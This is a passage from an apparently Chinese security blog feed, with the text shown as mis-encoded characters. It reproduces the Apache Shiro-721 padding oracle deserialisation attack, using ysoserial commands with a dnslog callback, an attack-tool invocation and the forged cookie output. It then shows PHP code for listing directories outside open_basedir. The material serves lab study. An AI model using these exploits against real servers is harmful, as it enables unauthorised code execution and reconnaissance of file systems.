<li>æ”»å‡»è€…èƒ½å¤Ÿè·å¾—å¯†æ–‡ï¼ˆCiphertextï¼‰ï¼Œä»¥åŠé™„å¸¦åœ¨å¯†æ–‡å‰é¢çš„IVå€¼ï¼ˆåˆå§‹åŒ–å‘é‡ï¼‰</li>
<li>æ”»å‡»è€…èƒ½å¤Ÿè§¦å‘å¯†æ–‡çš„è§£å¯†è¿‡ç¨‹ï¼Œä¸”èƒ½å¤ŸçŸ¥é“å¯†æ–‡çš„è§£å¯†ç»“æœ</li>
</ul>
</li>
<li>èƒ½å¤Ÿ è·å¾—å¯†æ–‡æˆ‘ä»¬æ‰èƒ½å¾—åˆ°æ­£ç¡®çš„æ˜æ–‡ï¼Œè€Œå¯†æ–‡çš„ç¬¬ä¸€ç»„åˆ†ç»„ éœ€è¦æœ‰æ­£ç¡®çš„åˆå§‹å‘é‡æ‰èƒ½è§£å¯†ã€‚èƒ½è§¦å‘å¯†æ–‡çš„è§£å¯†è¿‡ç¨‹æ‰èƒ½åœ¨ä¸çŸ¥é“å¯†é’¥çš„æƒ…å†µä¸‹ç»•è¿‡åŠ å¯†ç®—æ³•ç›´æ¥å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„ç»“æœï¼Œè€ŒçŸ¥é“å¯†æ–‡çš„è§£å¯†ç»“æœæ˜¯é€šè¿‡æœåŠ¡å™¨è¿”å›å€¼æ¥åˆ¤æ–­ç»“æœæ˜¯ä¸æ˜¯ç¬¦åˆå¡«å……æ ‡å‡†æ¥å®ç°çš„</li>
</ul>
<h5 id="å½±å“ç‰ˆæœ¬ï¼šApache-Shiro-lt-1-4-2ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬ï¼šApache-Shiro-lt-1-4-2ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬ï¼šApache Shiro &lt; 1.4.2ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬ï¼šApache Shiro &lt; 1.4.2ç‰ˆæœ¬</h5><h5 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h5><ul>
<li>ç™»å½•Shiroç½‘ç«™ï¼Œä»Cookieä¸­è·å–rememberMeå­—æ®µå€¼</li>
</ul>
<p><img src="/images/middleware/shiro/721-remember-cookie.png" alt="721-remember-cookie"></p>
<ul>
<li>åˆ©ç”¨DNSlogæ¢æµ‹ï¼Œé€šè¿‡ysoserialç”Ÿæˆpayload</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 <span class="string">"ping cedp8j.dnslog.cn"</span> &gt; payload.class</span><br></pre></td></tr></table></figure>

<p><img src="/images/middleware/shiro/721-dnslog-payload.png" alt="721-dnslog-payload"></p>
<ul>
<li>ä½¿ç”¨rememberMeå€¼ä½œä¸ºprefixï¼ŒåŠ è½½Payloadï¼Œè¿›è¡Œ<a href="https://github.com/longofo/PaddingOracleAttack-Shiro-721" target="_blank" rel="noopener">Padding Oracle</a>æ”»å‡»</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar PaddingOracleAttack.jar targetUrl rememberMeCookie blockSize payloadFilePath</span><br><span class="line"></span><br><span class="line">java -jar PaddingOracleAttack.jar http://192.168.67.153:8080/ quT6mlx30kPSeU+sXkH2wXE9d5oWVXkhToumO+4+tICqaWkpBq77H2AFuWz5t7JNHXXre0UfVXFpvk7vjfolR1EkJNftIFLHZ26+cPikj3mp6V2AgEzcyHdgJ/UVaDSyUxNrxpnLpjlfxe1V7X3MCroxSkis6Y/uB2BIN9M4p8mp50RMzlIxOSBNtMY9sJOb48eAo8OO4aTvzMKsFyzaO0fTwcueNxCJqiCdgovpj8vrp3R1CpRIeHwq7ldVBio95bI1Twtuv+Gy6kNDLsV41aeL0RM2tqp2XVgzTQ+Hi3H4kzF2/dzLU7M5Mg7g94uggu/NnV7HCYTX6SYHTRaH729JCEe2OFkYtwVEKk9s9cOxSPxIoLVRSgAZwKRO3CByEqAxm3L4MmuORAgorZf15DC0X1/OeFixLBN85LxitUwOtmFUidnWQQI/YaJDYxOU1+6HITJhHNgpMIKm3P46n06l302+k1vagcIl1BaresGoN93ahagQe2To/Tj33/EyAfVG0NbCu0Olp89aWzTxIw== 16 payload.class</span><br></pre></td></tr></table></figure>

<ul>
<li>çˆ†ç ´æˆåŠŸï¼Œè¾“å‡ºResult</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">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</span><br></pre></td></tr></table></figure>

<p><img src="/images/middleware/shiro/720-padding-cookie.png" alt="720-padding-cookie"></p>
<ul>
<li>ä½¿ç”¨æ„é€ çš„rememberMeæ”»å‡»å­—ç¬¦ä¸²é‡æ–°è¯·æ±‚ç½‘ç«™</li>
</ul>
<p><img src="/images/middleware/shiro/721-burp-rememberMe.png" alt="721-burp-rememberMe"></p>
<ul>
<li>æˆåŠŸè§¦å‘payloadï¼Œåœ¨DNSlogè·å–åˆ°ç›®æ ‡IP</li>
</ul>
<p><img src="/images/middleware/shiro/721-dnslog-result.png" alt="721-dnslog-result"></p>
<ul>
<li>â–² 2020-08-22 å› ä¸ºç¯å¢ƒé—®é¢˜ï¼Œå¤šæ¬¡å¤ç°å‡å­˜åœ¨é—®é¢˜ï¼Œæ‰€ä»¥ç”¨<code>ping cedp81j.dnslog.cn</code>æ¥ä»£æ›¿ï¼ŒçŒœæµ‹åŸå› å¦‚ä¸‹<ul>
<li>payloadè¿‡é•¿ï¼Œblocksizeé”™è¯¯</li>
<li>ç¯å¢ƒä¸ºShiro-550çš„ç¯å¢ƒï¼Œæ— æ³•å¤ç°Shiro-721çš„å®éªŒ</li>
</ul>
</li>
</ul>
<h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><ul>
<li><a href="https://www.cnblogs.com/loong-hon/p/10619616.html" target="_blank" rel="noopener">Apache Shiro Javaååºåˆ—åŒ–æ¼æ´åˆ†æ</a></li>
<li><a href="https://www.cnblogs.com/kbhome/p/13061633.html" target="_blank" rel="noopener">shiro java ååºåˆ—æ¼æ´å¤ç°</a></li>
<li><a href="https://www.cnblogs.com/xiaozi/p/13239046.html" target="_blank" rel="noopener">Shiroååºåˆ—åŒ–æ¼æ´åˆ©ç”¨æ±‡æ€»ï¼ˆShiro-550+Shiro-721ï¼‰</a></li>
<li><a href="https://blog.csdn.net/Aaron_Miller/article/details/106475088" target="_blank" rel="noopener">Shiroååºåˆ—åŒ–æ¼æ´</a></li>
<li><a href="https://www.freebuf.com/articles/database/151167.html" target="_blank" rel="noopener">Padding oracle attackè¯¦ç»†è§£æ</a></li>
</ul>
]]></content>
      <categories>
        <category>middleware</category>
      </categories>
  </entry>
  <entry>
    <title>PHPç»•è¿‡open_basedir</title>
    <url>/2020/10/27/md%E6%96%87%E4%BB%B6/bypass_open_basedir/</url>
    <content><![CDATA[<h2 id="PHPç»•è¿‡open-basedir"><a href="#PHPç»•è¿‡open-basedir" class="headerlink" title="PHPç»•è¿‡open_basedir"></a>PHPç»•è¿‡open_basedir</h2><h3 id="0X00-open-basedirç®€ä»‹"><a href="#0X00-open-basedirç®€ä»‹" class="headerlink" title="0X00 open_basedirç®€ä»‹"></a>0X00 open_basedirç®€ä»‹</h3><ul>
<li>open_basediræ˜¯PHPè®¾ç½®ä¸­ä¸ºäº†é˜²å¾¡PHPè·¨ç›®å½•è¿›è¡Œæ–‡ä»¶ï¼ˆç›®å½•ï¼‰è¯»å†™çš„æ–¹æ³•ï¼Œæ‰€æœ‰PHPä¸­æœ‰å…³æ–‡ä»¶è¯»ã€å†™çš„å‡½æ•°éƒ½ä¼šç»è¿‡open_basedirçš„æ£€æŸ¥</li>
<li>open_basedirå®é™…ä¸Šæ˜¯ä¸€äº›ç›®å½•çš„é›†åˆï¼Œåœ¨å®šä¹‰äº†open_basedirä»¥åï¼Œphpå¯ä»¥è¯»å†™çš„æ–‡ä»¶ã€ç›®å½•éƒ½å°†è¢«é™åˆ¶åœ¨è¿™äº›ç›®å½•ä¸­</li>
<li>è®¾ç½®open_basedirçš„æ–¹æ³•ï¼Œåœ¨linuxä¸‹ï¼Œä¸åŒçš„ç›®å½•ç”±â€œ:â€åˆ†å‰²ï¼Œå¦‚â€œ/var/www/:/tmp/â€ï¼›åœ¨Windowsä¸‹ä¸åŒç›®å½•ç”±â€œ;â€åˆ†å‰²ï¼Œå¦‚â€œc:/www;c:/windows/tempâ€</li>
</ul>
<h3 id="0X01-åˆ—ç›®å½•"><a href="#0X01-åˆ—ç›®å½•" class="headerlink" title="0X01 åˆ—ç›®å½•"></a>0X01 åˆ—ç›®å½•</h3><ul>
<li>â­ æ–‡ç« åˆ†ææ¥è‡ªPç‰›ï¼Œ<a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html" target="_blank" rel="noopener">PHPç»•è¿‡open_basediråˆ—ç›®å½•çš„ç ”ç©¶</a></li>
<li>â–² è®¾ç½®open_basedirä¸º/var/www/html/:/tmp/</li>
</ul>
<h5 id="åˆ©ç”¨DirectoryIterator-Glob"><a href="#åˆ©ç”¨DirectoryIterator-Glob" class="headerlink" title="åˆ©ç”¨DirectoryIterator + Glob"></a>åˆ©ç”¨DirectoryIterator + Glob</h5><ul>
<li>æ¦‚å¿µ<ul>
<li>DirectoryIterator æ˜¯php5ä¸­å¢åŠ çš„ä¸€ä¸ªç±»ï¼Œä¸ºç”¨æˆ·æä¾›ä¸€ä¸ªç®€å•çš„æŸ¥çœ‹ç›®å½•çš„æ¥å£</li>
<li>glob: æ•°æ®æµåŒ…è£…å™¨æ˜¯ä» PHP 5.3.0 èµ·å¼€å§‹æœ‰æ•ˆçš„ï¼Œç”¨æ¥æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„</li>
<li>â–² ç»“åˆDirectoryIterator + Globï¼Œå¯å¯¹ç›®å½•è¿›è¡Œéå†</li>
</ul>
</li>
<li>å½±å“ç‰ˆæœ¬ï¼šPHP &gt;= 5.3.0</li>
<li>æµ‹è¯•ä»£ç </li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">printf(<span class="string">'&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;'</span>, ini_get(<span class="string">'open_basedir'</span>));</span><br><span class="line">$file_list = <span class="keyword">array</span>();</span><br><span class="line"><span class="comment">// normal files</span></span><br><span class="line">$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///*"</span>);</span><br><span class="line"><span class="keyword">foreach</span>($it <span class="keyword">as</span> $f) &#123;</span><br><span class="line">    $file_list[] = $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// special files (starting with a dot(.))</span></span><br><span class="line">$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///.*"</span>);</span><br><span class="line"><span class="keyword">foreach</span>($it <span class="keyword">as</span> $f) &#123;</span><br><span class="line">    $file_list[] = $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line">sort($file_list);</span><br><span class="line"><span class="keyword">foreach</span>($file_list <span class="keyword">as</span> $f)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&#123;$f&#125;&lt;br/&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php-about/open-base-dir/directoryiterator_glob_list.png" alt="directoryiterator_glob_list"></p>
<h5 id="realpath"><a href="#realpath" class="headerlink" title="realpath"></a>realpath</h5><ul>
<li>æ¦‚å¿µ<ul>
<li>Realpathå‡½æ•°æ˜¯phpä¸­å°†ä¸€ä¸ªè·¯å¾„è§„èŒƒåŒ–æˆä¸ºç»å¯¹è·¯å¾„çš„æ–¹æ³•ï¼Œå®ƒå¯ä»¥å»æ‰å¤šä½™çš„../æˆ–./ç­‰è·³è½¬å­—ç¬¦ï¼Œèƒ½å°†ç›¸å¯¹è·¯å¾„è½¬æ¢æˆç»å¯¹è·¯å¾„ï¼ˆåœ¨å¼€å¯äº†open_basedirä¹‹åï¼‰<ul>
<li>å½“æˆ‘ä»¬ä¼ å…¥çš„è·¯å¾„æ˜¯ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶ï¼ˆç›®å½•ï¼‰æ—¶ï¼Œå®ƒå°†è¿”å›false</li>
<li>å½“æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªä¸åœ¨open_basediré‡Œçš„æ–‡ä»¶ï¼ˆç›®å½•ï¼‰æ—¶ï¼Œä»–å°†æŠ›å‡ºé”™è¯¯ï¼ˆFile is not within the allowed path(s)ï¼‰</li>
</ul>
</li>
</ul>
</li>
<li>æš´åŠ›åˆ—ä¸¾åˆ©ç”¨ï¼šå½“çŒœè§£æ ¹ç›®å½•ï¼ˆä¸åœ¨open_basedirä¸­ï¼‰ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œåªç”¨å†™ä¸€ä¸ªæ•æ‰phpé”™è¯¯çš„å‡½æ•°err_handle()ã€‚å½“çŒœè§£æŸä¸ªå­˜åœ¨çš„æ–‡ä»¶æ—¶ï¼Œä¼šå› æŠ›å‡ºé”™è¯¯è€Œè¿›å…¥err_handle()ï¼Œå½“çŒœè§£æŸä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶æ—¶ï¼Œå°†ä¸ä¼šè¿›å…¥err_handle()  </li>
<li>æµ‹è¯•ä»£ç <ul>
<li>å€ŸåŠ©Windowsä¸‹çš„ç‰¹æ®Šçš„é€šé…ç¬¦ï¼š<code>&lt;  &gt;</code>  -&gt;  æé«˜æš´åŠ›ç ´è§£æ•ˆç‡</li>
<li>é¦–å…ˆè®¾ç½®open_basedirä¸ºå½“å‰ç›®å½•ï¼Œå¹¶æšä¸¾ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œå°†é”™è¯¯å¤„ç†äº¤ç»™isexistså‡½æ•°ï¼Œåœ¨isexistså‡½æ•°ä¸­åŒ¹é…å‡ºç›®å½•åç§°ï¼Œå¹¶æ‰“å°å‡ºæ¥</li>
<li>â–² æ­¤æ–¹æ³•æ˜¯windowsä¸‹phpç‰ˆæœ¬é€šç”¨ï¼Œåœ¨Linuxç¯å¢ƒä¸‹å°±åªèƒ½æš´åŠ›ç ´è§£äº†</li>
</ul>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>, dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">printf(<span class="string">"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;"</span>, ini_get(<span class="string">'open_basedir'</span>));</span><br><span class="line">set_error_handler(<span class="string">'isexists'</span>);</span><br><span class="line">$dir = <span class="string">'e:/share/'</span>;</span><br><span class="line">$file = <span class="string">''</span>;</span><br><span class="line">$chars = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789_'</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; strlen($chars); $i++) &#123; </span><br><span class="line">    $file = $dir . $chars[$i] . <span class="string">'&lt;&gt;&lt;'</span>;</span><br><span class="line">    realpath($file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isexists</span><span class="params">($errno, $errstr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $regexp = <span class="string">'/File\((.*)\) is not within/'</span>;</span><br><span class="line">    preg_match($regexp, $errstr, $matches);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($matches[<span class="number">1</span>])) &#123;</span><br><span class="line">        printf(<span class="string">"%s &lt;br/&gt;"</span>, $matches[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php-about/open-base-dir/realpath-list.png" alt="realpath-list"></p>
<h5 id="SplFileInfo-getRealPath"><a href="#SplFileInfo-getRealPath" class="headerlink" title="SplFileInfo::getRealPath"></a>SplFileInfo::getRealPath</h5><ul>
<li><p>â–² realpathçš„æ›¿ä»£æ–¹æ³•</p>
</li>
<li><p>æ¦‚å¿µ</p>
<ul>
<li>SplFileInfoç±»æ˜¯PHP5.1.2ä¹‹åå¼•å…¥çš„ä¸€ä¸ªç±»ï¼Œæä¾›ä¸€ä¸ªå¯¹æ–‡ä»¶è¿›è¡Œæ“ä½œçš„æ¥å£ã€‚å…¶ä¸­æœ‰ä¸€ä¸ªå’Œrealpathåå­—å¾ˆåƒçš„æ–¹æ³•å«getRealPath</li>
<li>è¿™ä¸ªæ–¹æ³•åŠŸèƒ½å’Œrealpathç±»ä¼¼ï¼Œéƒ½æ˜¯è·å–ç»å¯¹è·¯å¾„ç”¨çš„ã€‚æˆ‘ä»¬åœ¨SplFileInfoçš„æ„é€ å‡½æ•°ä¸­ä¼ å…¥æ–‡ä»¶ç›¸å¯¹è·¯å¾„ï¼Œå¹¶ä¸”è°ƒç”¨getRealPathå³å¯è·å–æ–‡ä»¶çš„ç»å¯¹è·¯å¾„</li>
</ul>
</li>
<li><p>åˆ©ç”¨</p>
<ul>
<li>â–² æ­¤æ–¹æ³•å®Œå…¨æ²¡æœ‰è€ƒè™‘open_basedirï¼Œåœ¨è¿™ç‚¹ä¸Šä¸åŒäºrealpath</li>
<li>åœ¨ä¼ å…¥çš„è·¯å¾„ä¸ºä¸€ä¸ªä¸å­˜åœ¨çš„è·¯å¾„æ—¶ï¼Œä¼šè¿”å›false</li>
<li>åœ¨ä¼ å…¥çš„è·¯å¾„ä¸ºä¸€ä¸ªå­˜åœ¨çš„è·¯å¾„æ—¶ï¼Œä¼šæ­£å¸¸è¿”å›ç»å¯¹è·¯å¾„</li>
</ul>
</li>
<li><p>æµ‹è¯•ä»£ç </p>
<ul>
<li>â–² åŒæ ·çš„æ­¤æ–¹æ³•æ˜¯windowsä¸‹phpç‰ˆæœ¬é€šç”¨ï¼Œåœ¨Linuxç¯å¢ƒä¸‹å°±åªèƒ½æš´åŠ›ç ´è§£äº†</li>
</ul>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>, dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">printf(<span class="string">"&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;"</span>, ini_get(<span class="string">'open_basedir'</span>));</span><br><span class="line">$basedir = <span class="string">'e:/github/'</span>;</span><br><span class="line">$arr = <span class="keyword">array</span>();</span><br><span class="line">$chars = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789'</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; strlen($chars); $i++) &#123; </span><br><span class="line">    $info = <span class="keyword">new</span> SplFileInfo($basedir . $chars[$i] . <span class="string">'&lt;&gt;&lt;'</span>);</span><br><span class="line">    $re = $info-&gt;getRealPath();</span><br><span class="line">    <span class="keyword">if</span> ($re) &#123;</span><br><span class="line">        dump($re);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dump</span><span class="params">($s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $s . <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">    ob_flush();</span><br><span class="line">    flush();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php-about/open-base-dir/splfileinfo-getrealpath-list.png" alt="splfileinfo-getrealpath-list"></p>
<h5 id="bindtextdomainæš´åŠ›çŒœè§£"><a href="#bindtextdomainæš´åŠ›çŒœè§£" class="headerlink" title="bindtextdomainæš´åŠ›çŒœè§£"></a>bindtextdomainæš´åŠ›çŒœè§£</h5><ul>
<li><p>æ¦‚å¿µ</p>
<ul>
<li>bindtextdomainæ˜¯phpä¸‹ç»‘å®šdomainåˆ°æŸä¸ªç›®å½•çš„å‡½æ•°</li>
<li>â–² Bindtextdomainå‡½æ•°åœ¨ç¯å¢ƒæ”¯æŒGettext Functionsçš„æ—¶å€™æ‰èƒ½ä½¿ç”¨ï¼Œè€Œwindowsç¯å¢ƒä¸‹æ˜¯æ²¡æœ‰bindtextdomainå‡½æ•°çš„ï¼Œlinuxç¯å¢ƒæ˜¯é»˜è®¤å­˜åœ¨è¿™ä¸ªå‡½æ•°</li>
<li>â–² æ­¤å‡½æ•°æ–¹æ³•æ˜¯ä¸è€ƒè™‘open_basedirçš„</li>
</ul>
</li>
<li><p>åˆ©ç”¨ï¼šbindtextdomainçš„ç¬¬äºŒä¸ªå‡½æ•°<code>$directory</code>æ˜¯ä¸€ä¸ªæ–‡ä»¶è·¯å¾„ï¼Œä¼šåœ¨<code>$directory</code>å­˜åœ¨çš„æ—¶å€™è¿”å›<code>$directory</code>ï¼Œä¸å­˜åœ¨åˆ™è¿”å›false</p>
</li>
<li><p>æµ‹è¯•ä»£ç </p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">printf(<span class="string">'&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;'</span>, ini_get(<span class="string">'open_basedir'</span>));</span><br><span class="line">$re = bindtextdomain(<span class="string">'xxx'</span>, $_GET[<span class="string">'dir'</span>]);</span><br><span class="line">var_dump($re);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>å½“/etc/passwdå­˜åœ¨çš„æ—¶å€™è¾“å‡º</li>
</ul>
<p><img src="/images/php-about/open-base-dir/bindtextdomain-etc-passwd.png" alt="bindtextdomain-etc-passwd"></p>
<ul>
<li>å½“/etc/tomasä¸å­˜åœ¨çš„æ—¶å€™ä¼šè¿”å›false</li>
</ul>
<p><img src="/images/php-about/open-base-dir/bindtextdomain-etc-tomas.png" alt="bindtextdomain-etc-tomas"></p>
